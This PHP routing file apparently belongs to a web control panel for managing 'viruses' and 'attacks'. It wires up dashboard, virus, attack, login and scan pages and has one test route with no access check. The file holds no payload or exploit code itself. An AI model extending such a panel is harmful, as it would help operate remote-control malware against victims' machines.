<?php /** @noinspection PhpIncludeInspection */

// routes for UI
use Kelvinho\Virus\Attack\PackageRegistrar;
use Kelvinho\Virus\Singleton\Header;
use function Kelvinho\Virus\goodPath;

$router->get("", function () use ($requestData) {
    if (!$requestData->rightHost()) Header::notFound();
    \header("Location: " . DOMAIN_DASHBOARD);
    Header::redirect();
});
$router->get("dashboard", function () use ($requestData, $authenticator, $session, $userFactory, $virusFactory) {
    if (!$requestData->rightHost()) Header::notFound();
    include(__DIR__ . "/../view/dashboard.php");
});
$router->get("virus", function () use ($requestData, $authenticator, $session, $userFactory, $virusFactory, $attackFactory, $mysqli, $packageRegistrar) {
    if (!$requestData->rightHost()) Header::notFound();
    include(__DIR__ . "/../view/virus.php");
});
$router->get("attack", function () use ($requestData, $authenticator, $session, $userFactory, $attackFactory, $packageRegistrar) {
    if (!$requestData->rightHost()) Header::notFound();
    include(__DIR__ . "/../view/attack.php");
});
$router->get("login", function () use ($requestData, $authenticator) {
    if (!$requestData->rightHost()) Header::notFound();
    include(__DIR__ . "/../view/login.php");
});

// and resources
$router->get("resources/images/*", function () use ($requestData) {
    if (!$requestData->rightHost()) Header::notFound();
    if ($filePath = goodPath(__DIR__ . "/../resources/images/", $requestData->getExplodedPath()[2])) {
        \header("Content-type: " . mime_content_type($filePath));
        readfile($filePath);
    } else Header::notFound();
});

// and scanning the system
$router->get("scan", function () use ($requestData, $whitelistFactory, $mysqli) {
    $whitelist = $whitelistFactory->new();
    $whitelist->addIp($requestData->serverCheck("SERVER_ADDR"));
    if (!$whitelist->allowed($requestData->serverCheck("REMOTE_ADDR")))
        $requestData->rightHost() ? Header::redirectToHome() : Header::notFound();
    include(__DIR__ . "/../scan.php");
});

$router->get("test", function() {
    include(__DIR__ . "/../test.php");
});
